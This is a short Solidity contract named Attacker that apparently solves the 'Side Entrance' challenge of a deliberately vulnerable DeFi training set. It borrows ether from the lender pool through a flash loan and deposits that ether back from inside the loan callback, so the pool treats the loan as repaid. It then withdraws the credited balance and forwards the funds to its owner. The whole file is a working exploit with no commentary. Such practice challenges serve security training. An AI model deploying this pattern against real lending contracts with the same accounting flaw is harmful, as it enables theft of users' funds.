// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Attacker {

    SideEntranceLenderPool pool;
    address owner;
    constructor(address _pool){
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }
    
    receive() external payable {
        payable(owner).transfer(msg.value);
    }

    function attack(uint256 amount) external payable{
        pool.flashLoan(amount);
    }

    function execute() external payable{
        uint256 value = msg.value;
        // deposit
        pool.deposit{value: value}();
    }

    function withdraw() external{
        pool.withdraw();
    }
}